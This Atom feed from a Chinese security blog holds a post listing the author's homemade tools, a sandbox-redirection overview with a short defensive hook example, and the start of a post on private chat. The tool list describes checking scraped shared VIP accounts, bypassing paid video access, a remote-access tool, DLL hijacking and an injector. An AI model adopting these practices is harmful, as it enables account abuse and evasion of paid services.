<?xml version="1.0" encoding="utf-8"?> <feed xmlns="http://www.w3.org/2005/Atom">   <title>Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘</title>   <subtitle>Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</subtitle>   <link href="/atom.xml" rel="self"/>      <link href="https://anhkgg.github.io/"/>   <updated>2019-10-18T08:38:33.971Z</updated>   <id>https://anhkgg.github.io/</id>      <author>     <name>Anhkgg</name>        </author>      <generator uri="http://hexo.io/">Hexo</generator>      <entry>     <title>程序员的生活原来这么丰富:)-造轮子，撸工具的乐趣</title>     <link href="https://anhkgg.github.io/anhkgg-tools/"/>     <id>https://anhkgg.github.io/anhkgg-tools/</id>     <published>2019-10-18T08:34:35.000Z</published>     <updated>2019-10-18T08:38:33.971Z</updated>          <content type="html"><![CDATA[<blockquote> <p>author: anhkgg<br>date: 2019年10月17日</p> </blockquote> <h3 id="原标题：造轮子，撸工具的乐趣"><a href="#原标题：造轮子，撸工具的乐趣" class="headerlink" title="原标题：造轮子，撸工具的乐趣"></a>原标题：造轮子，撸工具的乐趣</h3><p>从开始学习编程到现在，一直喜欢写些小工具，也会重复造轮子。</p> <p>为什么要自己撸呢？</p> <p>~当然是因为别人撸的不好（逃）~</p> <a id="more"></a> <p>因为：</p> <ul> <li>自己某些小需求，并没有现成工具</li> <li>别人的工具有些瑕疵，没有达到自己的预期，而且没有开源，不好改</li> <li>有时是为了，减少人工，重复劳动，完成自动化</li> <li>有时是为了技术学习验证</li> <li>有时纯粹因为好玩</li> <li>但都会带来小小的成就感，感觉世界就掌握在自己手中</li> </ul> <p>今天看到介绍鲁大师前世今生的文章，原来做工具也可以成立公司、打入海外、敲钟上市、走上人生巅峰的。</p> <p>所以为什么不可以造轮子，撸工具呢。</p> <h4 id="1、做了些什么？"><a href="#1、做了些什么？" class="headerlink" title="1、做了些什么？"></a>1、做了些什么？</h4><p>下面列的是从我学生时期，到现在能够找到的部分小工具，有些分享出来了，有些保留自用的。</p> <h5 id="看人品双色球"><a href="#看人品双色球" class="headerlink" title="看人品双色球"></a>看人品双色球</h5><p><img src="/img/anhkgg-tools/doublecolorball.png" alt="img"></p> <p>学生时期，有段时间买双色球，可是不知道买什么号，就做了这个小玩意，纯粹是随机数，看人品。</p> <table> <thead> <tr> <th>状态：</th> <th>完成</th> </tr> </thead> <tbody> <tr> <td>好玩指数：</td> <td>★☆☆☆☆</td> </tr> </tbody> </table> <h5 id="迅雷VIP账号验证"><a href="#迅雷VIP账号验证" class="headerlink" title="迅雷VIP账号验证"></a>迅雷VIP账号验证</h5><p><img src="/img/anhkgg-tools/xunlei1.png" alt="img"></p> <p>学生时期，刚学完python不久，各种练手，那时候用迅雷各种下载小时候想看的电视剧、电影。<br>可是没会员速度不给力，找网上分享的各种vip，但有些账号是不能用的，一个个试太费事了。<br>没法，只好写个工具，爬取vip账号，自动登陆尝试账号是否可用，效果不错。<br>因为账号是共享的，可能会被别人挤下去，所以另外还要配合一个断线重连工具使用。</p> <table> <thead> <tr> <th>状态：</th> <th>找不到vip获取工具了</th> </tr> </thead> <tbody> <tr> <td>好玩指数：</td> <td>★★☆☆☆</td> </tr> </tbody> </table> <h5 id="简单计算器"><a href="#简单计算器" class="headerlink" title="简单计算器"></a>简单计算器</h5><p><img src="/img/anhkgg-tools/calc.png" alt="img"></p> <p>学生时期，完成的作业</p> <table> <thead> <tr> <th>状态：</th> <th>完成</th> </tr> </thead> <tbody> <tr> <td>好玩指数：</td> <td>★☆☆☆☆</td> </tr> </tbody> </table> <h5 id="文件浏览器"><a href="#文件浏览器" class="headerlink" title="文件浏览器"></a>文件浏览器</h5><p><img src="/img/anhkgg-tools/explorer.png" alt="img"></p> <p>学生时期，完成的作业</p> <table> <thead> <tr> <th>状态：</th> <th>完成</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★☆☆☆☆</td> </tr> </tbody> </table> <h5 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h5><p><img src="/img/anhkgg-tools/py2exe.png" alt="img"></p> <p>学生时期，一个GUI工具，使用py2exe编译python为可发布的exe，那时候好像还没有GUI2exe。</p> <table> <thead> <tr> <th>状态：</th> <th>目前都还在用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★☆☆☆</td> </tr> </tbody> </table> <h5 id="自动签到"><a href="#自动签到" class="headerlink" title="自动签到"></a>自动签到</h5><p>学生时期，学了python，各种分析网站登陆、签到功能之类，然后用python实现。以至于工作了，还想弄个pylogin。</p> <table> <thead> <tr> <th>状态：</th> <th>python是真好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★☆☆☆</td> </tr> </tbody> </table> <h5 id="注入器"><a href="#注入器" class="headerlink" title="注入器"></a>注入器</h5><p><img src="/img/anhkgg-tools/inject.png" alt="img"></p> <p>学习注入之后的产物。</p> <table> <thead> <tr> <th>状态：</th> <th>能用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★☆☆☆</td> </tr> <tr> <td>下载地址：</td> <td><a href="https://download.csdn.net/download/angelxf/4271110" target="_blank" rel="noopener">https://download.csdn.net/download/angelxf/4271110</a></td> </tr> </tbody> </table> <h5 id="错误码查询"><a href="#错误码查询" class="headerlink" title="错误码查询"></a>错误码查询</h5><p><img src="/img/anhkgg-tools/error.png" alt="img"></p> <p>都知道vs自带错误码查询工具，但是不支持内核错误码，所以做了这个，两种都支持，另外也是为了练手duilib。<br>值得一提的是，界面使用windows自带画图画的，还能看。</p> <table> <thead> <tr> <th>状态：</th> <th>很好</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★☆☆☆</td> </tr> <tr> <td>下载地址：</td> <td><a href="https://download.csdn.net/download/angelxf/10209284" target="_blank" rel="noopener">https://download.csdn.net/download/angelxf/10209284</a></td> </tr> </tbody> </table> <h5 id="114抢号"><a href="#114抢号" class="headerlink" title="114抢号"></a>114抢号</h5><p><img src="/img/anhkgg-tools/114.png" alt="img"></p> <p>有段时间经常需要挂号，当时是在114平台在线挂号，每天早上8点开始放号，网上的号也没几个，又遇上上班的点，很难人工抢到号。更变态的是每次都要输入验证码，真实难上加难。</p> <p>所以开始考虑实现一个抢号工具，难点主要在验证码的获取，并且是自己的手机号。</p> <p>第一版的时候，是直接java写的，然后usb连上手机，监控短信，拿到验证码，完成自动化抢号。但因为上班时间，所以开了台电脑在家，不用的手机也放家里，才算完成了抢号。</p> <p>后面直接做了app版本，直接在手机端完成所有工作。</p> <table> <thead> <tr> <th>状态：</th> <th>效果非常好</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★☆</td> </tr> </tbody> </table> <h5 id="hosts编辑器"><a href="#hosts编辑器" class="headerlink" title="hosts编辑器"></a>hosts编辑器</h5><p><img src="/img/anhkgg-tools/hostseditor.png" alt="img"></p> <p>因为windows UAC限制，很多时候为了修改hosts文件，都需要复制出来hosts，然后修改了，再复制回去，很麻烦的事情。<br>我非常嫌麻烦，所以做了这个工具，可以直接修改，查看，不用复制来复制去了。</p> <table> <thead> <tr> <th>状态：</th> <th>能用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★☆☆</td> </tr> <tr> <td>下载地址：</td> <td><a href="https://download.csdn.net/download/angelxf/11834888" target="_blank" rel="noopener">https://download.csdn.net/download/angelxf/11834888</a></td> </tr> </tbody> </table> <h5 id="宽带IP自动同步"><a href="#宽带IP自动同步" class="headerlink" title="宽带IP自动同步"></a>宽带IP自动同步</h5><p>这个是什么东西呢？</p> <p>因为家里放了台性能很好的台式机，上班也想直接用于开发，但是不想搬到公司去。所以台式机开了远程桌面，然后配置路由器端口映射，就可以直接在公司远程连接操作了。因为是tcp直接连接，比某些其他远控软件肯定快了非常多，基本感受不到延迟，体验很好。</p> <p>但问题是，现在开宽带都不提供独立ip了，所以家里电脑的外网ip经常更换，经常用着用着断掉了，工作也歇了。</p> <p>所以就搞了一套实时获取台式机外网ip，上传ip到某个位置，然后公司电脑自动同步ip的工具，在ip更换的情况下，也能够自动更新，再也不怕掉线了。</p> <table> <thead> <tr> <th>状态：</th> <th>完美</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> </tbody> </table> <h5 id="字符编码工具"><a href="#字符编码工具" class="headerlink" title="字符编码工具"></a>字符编码工具</h5><p><img src="/img/anhkgg-tools/charcode.png" alt="img"></p> <p>这种工具很多，但有些时候就是不满足我的需求，比如没法直接进制转换、不能猜测是什么编码。</p> <p>所以我加上了这两个功能，自己撸了一个。</p> <table> <thead> <tr> <th>状态：</th> <th>经常用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> <tr> <td>下载地址：</td> <td><a href="https://download.csdn.net/download/angelxf/11834897" target="_blank" rel="noopener">https://download.csdn.net/download/angelxf/11834897</a></td> </tr> </tbody> </table> <h5 id="神算子偏移计算器"><a href="#神算子偏移计算器" class="headerlink" title="神算子偏移计算器"></a>神算子偏移计算器</h5><p><img src="/img/anhkgg-tools/shensuanzi.png" alt="img"></p> <p>这个工具其实之前已经安利过了。</p> <p>做逆向调试的小伙伴应该都遇到过这种问题：在同时使用两大神器OD(或Windbg)和IDA逆向某程序时，调试中模块基址经常变化，而在IDA中默认为0x400000（或0x10000000），所以在调试到某个点想到IDA整体对比分析一下的时候，发现计算地址真的好麻烦，特别时在经常需要计算的时候，这个问题尤为明显。</p> <p>这个工具可以很方便的计算偏移，转换等。</p> <table> <thead> <tr> <th>状态：</th> <th>很好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> <tr> <td>下载地址：</td> <td><a href="https://mp.weixin.qq.com/s/glCFGcQN0RBJXqKwqmQqBw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/glCFGcQN0RBJXqKwqmQqBw</a></td> </tr> </tbody> </table> <h5 id="chisechat"><a href="#chisechat" class="headerlink" title="chisechat"></a>chisechat</h5><p><img src="/img/anhkgg-tools/1.png" alt="img"></p> <p>这是最近安利的一个小工具，主要用于私密聊天。</p> <table> <thead> <tr> <th>状态：</th> <th>很好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> <tr> <td>下载地址：</td> <td><a href="https://anhkgg.com/Chisechat" target="_blank" rel="noopener">https://anhkgg.com/Chisechat</a></td> </tr> <tr> <td>文章：</td> <td><a href="https://mp.weixin.qq.com/s/SV4bxTTURnXDUMR83XDHpg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/SV4bxTTURnXDUMR83XDHpg</a></td> </tr> </tbody> </table> <h5 id="answerot"><a href="#answerot" class="headerlink" title="answerot"></a>answerot</h5><p><img src="/img/anhkgg-tools/answerot.jpg" alt="img"></p> <p>那段时间直播答题非常火热，也参与了，但知识有限，不得不借助外力，所以有了这个项目。</p> <table> <thead> <tr> <th>状态：</th> <th>当时提好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★☆</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/answerot" target="_blank" rel="noopener">https://github.com/answerot</a></td> </tr> </tbody> </table> <h5 id="pyrat"><a href="#pyrat" class="headerlink" title="pyrat"></a>pyrat</h5><p>PyRat，基于python XmlRPC完成的远控开源项目，包括客户端和服务端（也叫控制端，后统称服务端）。</p> <p>做这个其实是为了做一个跨平台的rat，也为了可能某些时候文件传输使用，也为了复习相关技术。</p> <table> <thead> <tr> <th>状态：</th> <th>基本完成，可能更新</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★☆☆</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/PyRat" target="_blank" rel="noopener">https://github.com/anhkgg/PyRat</a></td> </tr> </tbody> </table> <h5 id="pylogin"><a href="#pylogin" class="headerlink" title="pylogin"></a>pylogin</h5><p>这就是我前面提到的，想完成一个模拟登陆的库，支持各种常用的网站，理想很丰满，现实很残酷。</p> <p>分析各种网站登陆协议挺费事的，目前仅做了v2ex、百度统计、畅言。</p> <table> <thead> <tr> <th>状态：</th> <th>暂时搁置</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★☆☆</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/pylogin" target="_blank" rel="noopener">https://github.com/anhkgg/pylogin</a></td> </tr> </tbody> </table> <h5 id="一键电影下载"><a href="#一键电影下载" class="headerlink" title="一键电影下载"></a>一键电影下载</h5><p>如题，就是为了方便。</p> <table> <thead> <tr> <th>状态：</th> <th>好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★☆</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/MovieHunter" target="_blank" rel="noopener">https://github.com/anhkgg/MovieHunter</a></td> </tr> </tbody> </table> <h5 id="52备份"><a href="#52备份" class="headerlink" title="52备份"></a>52备份</h5><p>一个批量下载52pojie爱盘中资源的小脚本。因为52爱盘整理的工具很多，也挺好用的，不由自主地想备份一下。</p> <table> <thead> <tr> <th>状态：</th> <th>好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★☆</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/Get52PojieTools" target="_blank" rel="noopener">https://github.com/anhkgg/Get52PojieTools</a></td> </tr> </tbody> </table> <h5 id="程序员钢琴曲"><a href="#程序员钢琴曲" class="headerlink" title="程序员钢琴曲"></a>程序员钢琴曲</h5><p>这是我觉得自己做的<strong>最好玩</strong>的一个工具了，没有之一。</p> <p>一天玩钢琴软件，突然冒出来的一个想法，写代码的时候是不是也可以发出优美的琴声呢。</p> <p>让代码变成一首钢琴曲，让程序员也成为钢琴大师！</p> <table> <thead> <tr> <th>状态：</th> <th>好听</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/coding_piano" target="_blank" rel="noopener">https://github.com/anhkgg/coding_piano</a></td> </tr> <tr> <td>文章地址：</td> <td><a href="https://mp.weixin.qq.com/s/psiP7NtSOZt2TGsR0QTIow" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/psiP7NtSOZt2TGsR0QTIow</a></td> </tr> </tbody> </table> <h5 id="SuperDllHijack"><a href="#SuperDllHijack" class="headerlink" title="SuperDllHijack"></a>SuperDllHijack</h5><p>这个算是一种技术研究分享，一种通用Dll劫持技术，不再需要手工导出Dll的函数接口了。</p> <table> <thead> <tr> <th>状态：</th> <th>好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/SuperDllHijack" target="_blank" rel="noopener">https://github.com/anhkgg/SuperDllHijack</a></td> </tr> <tr> <td>文章地址：</td> <td><a href="https://mp.weixin.qq.com/s/Nx4C2mx94V9vhvU8Eqfobg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Nx4C2mx94V9vhvU8Eqfobg</a></td> </tr> </tbody> </table> <h5 id="超级笔记本"><a href="#超级笔记本" class="headerlink" title="超级笔记本"></a>超级笔记本</h5><p><img src="/img/anhkgg-tools/supernotebook.png" alt="img"></p> <p>这是我自用的重度工具，用于记录笔记，写文章等等。</p> <p>可以理解为一个定制的离线版有道云笔记，支持markdown，实时预览，打印。</p> <p>当初想做这个，有几个原因：</p> <ul> <li>有些笔记不想同步到云上，所以要离线版</li> <li>有些笔记想保留历史记录，所以用了git来保存文章</li> <li>想统一管理笔记、文章、周报、会议纪要等等</li> </ul> <p>自己想要的东西，基本都做完了，不过还在持续迭代中。</p> <table> <thead> <tr> <th>状态：</th> <th>重度使用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> </tbody> </table> <h5 id="superwechatpc"><a href="#superwechatpc" class="headerlink" title="superwechatpc"></a>superwechatpc</h5><p>略。</p> <table> <thead> <tr> <th>状态：</th> <th>重度使用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> <tr> <td>项目地址：</td> <td><a href="https://github.com/anhkgg/SuperWeChatPC" target="_blank" rel="noopener">https://github.com/anhkgg/SuperWeChatPC</a></td> </tr> </tbody> </table> <h5 id="密码本"><a href="#密码本" class="headerlink" title="密码本"></a>密码本</h5><p><img src="/img/anhkgg-tools/secure_explorer.png" alt="img"></p> <p>各种网站、app密码太多，怎么保存，怎么管理？万一电脑遗失，密码被人看到咋办？</p> <p>可以用压缩文件加密压缩，但是使用不方便。</p> <p>所以自己撸了一个文件浏览器，类似压缩文件格式（自定义）保存，支持文件口令，支持实时查看、搜索、增加、删除密码记录等等。</p> <table> <thead> <tr> <th>状态：</th> <th>重度使用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> </tbody> </table> <h5 id="文件隐藏工具"><a href="#文件隐藏工具" class="headerlink" title="文件隐藏工具"></a>文件隐藏工具</h5><p><img src="/img/anhkgg-tools/filesecure.png" alt="img"></p> <p>电脑上有没有不想被人看到的文件？给explorer加个隐身功能吧，需要输入正确口令才能查看文件哦，功能直接看图。</p> <table> <thead> <tr> <th>状态：</th> <th>好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> </tbody> </table> <h5 id="vip搜索播放"><a href="#vip搜索播放" class="headerlink" title="vip搜索播放"></a>vip搜索播放</h5><p><img src="/img/anhkgg-tools/supervid.png" alt="img"></p> <p>现在为了能够准时追剧，不慢人一步，没有vip是不行的。我也有爱奇艺vip，但是我想看的不在爱奇艺播，你说气人不气人，难道为了看一部电视剧或电影就去买个其他两个平台的会员，是不是太不划算了。</p> <p>网上有很多vip解析接口，有些时候能够解一时燃眉之急。</p> <p>但是体验不好啊，每次都要去官网找到视频连接，放到解析网站才能播放。</p> <p>所以我把搜索和vip播放集成了，就在我的工具搜索（支持qq、爱奇艺），然后直接播放，体验很棒。</p> <p>不过，我现在真的买了个三个平台的会员，哭。</p> <table> <thead> <tr> <th>状态：</th> <th>好用</th> </tr> </thead> <tbody> <tr> <td>有用指数：</td> <td>★★★★★</td> </tr> </tbody> </table> <p>想介绍的就这些了，前一部分非常水，毕竟是刚入门不久写的。<br>后面的工具自我感觉是非常有意思、有用的，也一直在用，所以它们确实带给我了很多成就感。</p> <p>当然还有很多工具，年代久远，忘了，找不到了。</p> <p>如果大家有对某些工具感兴趣的，可以留言，我会酌情放出。</p> <h4 id="2、最后"><a href="#2、最后" class="headerlink" title="2、最后"></a>2、最后</h4><p>这篇文章一个是为了自我总结，看看自己这些年究竟折腾了些什么东西，另外也是希望能够找到些同道中人，做做下面说的事情。</p> <p>如果大家有什么有趣的想法或需求，还没有做出来的，如果是能够分享到的，可以到项目<code>github.com/anhkgg/anhkgg-tools</code>留言区第一个issue留言，或者点赞支持别人的想法。我可以从中挑选感兴趣的东西尝试做一做，然后分享到项目中，当然也欢迎其他感兴趣的朋友参与一起开发，为大家贡献一些好玩好用的小工具。</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/anhkgg-tools">https://anhkgg.github.io/anhkgg-tools</a></p> <p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> ]]></content>          <summary type="html">            &lt;blockquote&gt; &lt;p&gt;author: anhkgg&lt;br&gt;date: 2019年10月17日&lt;/p&gt; &lt;/blockquote&gt; &lt;h3 id=&quot;原标题：造轮子，撸工具的乐趣&quot;&gt;&lt;a href=&quot;#原标题：造轮子，撸工具的乐趣&quot; class=&quot;headerlink&quot; title=&quot;原标题：造轮子，撸工具的乐趣&quot;&gt;&lt;/a&gt;原标题：造轮子，撸工具的乐趣&lt;/h3&gt;&lt;p&gt;从开始学习编程到现在，一直喜欢写些小工具，也会重复造轮子。&lt;/p&gt; &lt;p&gt;为什么要自己撸呢？&lt;/p&gt; &lt;p&gt;~当然是因为别人撸的不好（逃）~&lt;/p&gt;          </summary>             </entry>      <entry>     <title>沙箱：概述</title>     <link href="https://anhkgg.github.io/sandbox-summary/"/>     <id>https://anhkgg.github.io/sandbox-summary/</id>     <published>2019-10-05T02:58:49.000Z</published>     <updated>2019-10-05T03:11:36.413Z</updated>          <content type="html"><![CDATA[<blockquote> <p>author: anhkgg<br>date: 2019-10-05</p> </blockquote> <p>最早接触沙箱，对它的印象就是：<a href="https://www.sandboxie.com/" target="_blank" rel="noopener">sandboxie</a>。</p> <p>因为学的是安全相关专业，在网上下载东西非常谨慎，就算通过了杀毒软件扫描，但是也怕有后门或者其他东西，毕竟我也可以静态过掉杀软。</p> <p>很多软件没有官网，各种下载站的东西真的是让人不放心。</p> <p>所以在下载某些软件后，只要不影响功能，基本都会用sandboxie来运行软件。如果不行，则放到虚拟机里。</p> <p>所以我对沙箱最初的概念就是：sandboxie，它是一个轻量级虚拟机，软件的操作都不会影响真正的系统，包括文件、注册表等等资源，可以放肆地想干嘛干嘛。</p> <p>那时当然是不怎么知道sanboxie是怎么做的。</p> <p>题外话：最近因为微软的关系，sanboxie已选宣布免费，后续还可能开源，感兴趣的可以关注关注。</p> <a id="more"></a> <h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>注：沙箱现在的概念非常杂，某些分析平台后端也叫沙箱，主要关注的行为获取，我这里说的不一样。</p> <p>那么沙箱究竟是怎么做的呢？</p> <p>一句话概括的话就是：<strong>沙箱内万物基于重定向</strong>。</p> <p><strong>重定向</strong>，顾名思义，就是重新指定方向，也就是说沙箱能够做到让沙箱内软件操作的文件、注册表等路径重定向到其他位置（沙箱指定位置），这样软件本来想操作的资源就不会被访问或者操作，保证资源的安全性。</p> <p>这也就是我使用沙箱跑一些不明软件的原因，万一软件被恶意修改过，存在病毒，想破坏系统关键文件，也就不可能了。</p> <p>言归正传。</p> <p>重定向我们还有个高级的词叫做“<strong>虚拟化</strong>”，也可以称作”<strong>隔离</strong>“，说到底沙箱就是为程序提供一个虚拟化环境，也就是隔离环境，并保证程序所有操作都在这个隔离环境内。</p> <p>再举一个简单的例子理解一下重定向。如果程序要删除c:\boot.ini，沙箱如何做到隔离，保证文件不被删除呢。</p> <ol> <li>沙箱hook ZwDeleteFile，函数是HOOK_ZwDeleteFile。</li> <li>在HOOK_ZwDeleteFile中，讲路径c:\boot.ini加上一个前缀c:\sandbox\boot.ini，转到沙箱内文件路径。</li> <li>c:\sandbox\boot.ini不存在，会先把c:\boot.ini拷贝到沙箱内。</li> <li>然后调用原始ZwDeleteFile，删除c:\sandbox\boot.ini。</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS HOOK_ZwDeleteFile(</span><br><span class="line">  POBJECT_ATTRIBUTES ObjectAttributes</span><br><span class="line">) &#123;</span><br><span class="line">   AddPrefix(ObjectAttributes-&gt;ObjectName, L&quot;sandbox&quot;);//路径加上沙箱前缀</span><br><span class="line">   if(!PathFileExists(ObjectAttributes-&gt;ObjectName.Buffer)) &#123;</span><br><span class="line">      CopyFile();//拷贝进来</span><br><span class="line">   &#125;</span><br><span class="line">   return OrigZwDeleteFile(ObjectAttributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>如此就完成了一个简单的删除文件的隔离。</p> <p>一个完备的沙箱一般需要虚拟化（隔离）处理这些东西：</p> <ol> <li>文件</li> <li>注册表</li> <li>DCOM(RPCSS)</li> <li>服务</li> <li>其他如：窗口、类名、消息、token等。</li> <li>进程、线程安全</li> <li>全局钩子、注入等防护</li> <li>驱动加载</li> <li>…</li> </ol> <p>下面对比较重要的几个内容进行一下阐述。</p> <h3 id="文件重定向"><a href="#文件重定向" class="headerlink" title="文件重定向"></a>文件重定向</h3><p>保证沙箱内程序创建、修改、删除、读取等文件操作都在沙箱内，不会影响系统中真实的文件。</p> <p>功能实现方式由很多，主要可以按下面分为：</p> <ol> <li>用户态实现，hook ntdll.dll文件相关函数，然后路径重定向</li> <li>内核态实现，ssdt hook文件相关函数，或者minifilter等技术</li> </ol> <p>用户态实现较为简单，语义更清晰，但是强度不够，有很多方式穿透ntdll.dll这层的文件操作函数，导致文件重定向（隔离）失败，比如用户态通过直接扇区读写来修改文件。</p> <p>内核态如果使用minifilter来实现，强度基本就够了。</p> <p>不过sandboxie是在用户态实现的。</p> <h3 id="注册表重定向"><a href="#注册表重定向" class="headerlink" title="注册表重定向"></a>注册表重定向</h3><p>保证沙箱内程序创建、修改、删除、读取等注册表操作都在沙箱内，不会影响系统中真实的注册表信息。</p> <p>同样，和文件重定向一样，也可以在用户态或内核态使用不同的技术完成，先不细说。</p> <h3 id="DCOM虚拟化"><a href="#DCOM虚拟化" class="headerlink" title="DCOM虚拟化"></a>DCOM虚拟化</h3><p>其实做DCOM虚拟化，最主要是为了防止沙箱内程序逃逸。</p> <p>所谓逃逸，就是沙箱无法控制沙箱内程序行为，程序可以绕过沙箱，对系统造成破坏。</p> <p>逃逸的方式有很多，对于支持DCOM的程序，就是其中一种。</p> <p>举个例子，在wordpad.exe(写字板）插入对象-画笔图片，会启动mspaint，可以看到mspaint是svchost.exe -k DcomLaunch的子进程。</p> <p><img src="/img/sandbox/dcom.png" alt="img"></p> <p>什么意思呢？</p> <p>一般来说，如果在沙箱中启动wordpad.exe，wordpad.exe的子进程默认也会进入沙箱，但通过DCOM启动的mspaint就没法拉入沙箱了，它不是wordpad.exe子进程。</p> <p>所以，此时需要虚拟化DCOM，让沙箱内启动一个DCOM服务，这样wordpad.exe直接和沙箱内DCOM通信，启动子进程mspaint.exe，作为沙箱内DCOM服务的子进程，自然也被拉入沙箱内。</p> <p>如此做到组织逃逸。</p> <p>这里面涉及到很多技术细节，如RPC，后面细说。</p> <h3 id="服务虚拟化"><a href="#服务虚拟化" class="headerlink" title="服务虚拟化"></a>服务虚拟化</h3><p>其实服务也是逃逸沙箱的一种方式，但是也可以说如果沙箱不支持服务虚拟化，某些程序就不能在沙箱内正常工作。</p> <p>所以不管出于那种原因考虑，沙箱都得实现服务虚拟化。</p> <p>至于说服务也能逃逸是怎么回事呢？</p> <p>很简单，程序通过服务API创建一个服务，然后启动服务，对应服务程序就没法被沙箱接管，逃出沙箱控制。</p> <p>实现就是接管服务相关API了。</p> <h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>剩下的其他内容，暂时也不分析了，如果有时间，后面继续分享。</p> <h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>前面说的内容都是如何完成虚拟化的东西，一个成熟的沙箱肯定还包括其他很多东西，比如多沙箱的支持、沙箱清理、安全浏览器等等，不过这些都不在我们重点讨论范围，毕竟这些只有在实际产品才会考虑的问题，我们这里只是研究沙箱核心相关的技术。</p> <p>另外，针对每种重定向技术细节后续会慢慢详细分享，敬请关注。</p> <p>最后，再来一张简单的沙箱框图。</p> <p><img src="/img/sandbox/sandbox.png" alt="img"></p> <p>转载请注明出处：<a href="https://anhkgg.github.io/sandbox-summary">https://anhkgg.github.io/sandbox-summary</a></p> <p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> ]]></content>          <summary type="html">            &lt;blockquote&gt; &lt;p&gt;author: anhkgg&lt;br&gt;date: 2019-10-05&lt;/p&gt; &lt;/blockquote&gt; &lt;p&gt;最早接触沙箱，对它的印象就是：&lt;a href=&quot;https://www.sandboxie.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;sandboxie&lt;/a&gt;。&lt;/p&gt; &lt;p&gt;因为学的是安全相关专业，在网上下载东西非常谨慎，就算通过了杀毒软件扫描，但是也怕有后门或者其他东西，毕竟我也可以静态过掉杀软。&lt;/p&gt; &lt;p&gt;很多软件没有官网，各种下载站的东西真的是让人不放心。&lt;/p&gt; &lt;p&gt;所以在下载某些软件后，只要不影响功能，基本都会用sandboxie来运行软件。如果不行，则放到虚拟机里。&lt;/p&gt; &lt;p&gt;所以我对沙箱最初的概念就是：sandboxie，它是一个轻量级虚拟机，软件的操作都不会影响真正的系统，包括文件、注册表等等资源，可以放肆地想干嘛干嘛。&lt;/p&gt; &lt;p&gt;那时当然是不怎么知道sanboxie是怎么做的。&lt;/p&gt; &lt;p&gt;题外话：最近因为微软的关系，sanboxie已选宣布免费，后续还可能开源，感兴趣的可以关注关注。&lt;/p&gt;          </summary>            <category term="sandbox" scheme="https://anhkgg.github.io/categories/sandbox/"/>                 <category term="security" scheme="https://anhkgg.github.io/tags/security/"/>            <category term="sandbox" scheme="https://anhkgg.github.io/tags/sandbox/"/>        </entry>      <entry>     <title>程序员对私密聊天的乱想</title>     <link href="https://anhkgg.github.io/security-chat/"/>     <id>https://anhkgg.github.io/security-chat/</id>     <published>2019-09-06T03:19:27.000Z</published>     <updated>2019-09-06T03:23:23.388Z</updated>          <content type="html"><![CDATA[<h3 id="唠叨"><a href="#唠叨" class="headerlink" title="唠叨"></a>唠叨</h3><p>群里有人推了个项目<a href="https://github.com/dplusec/tgwechat" target="_blank" rel="noopener">TgWechat</a>，微信端对端加密插件，还特意@了我表示感谢，受宠若惊。</p> <p>隐私问题其实说了很久，有人说微信其实一直看着我们聊天，具体是怎么样的，咱也不知道，咱也不敢问吖…</p> 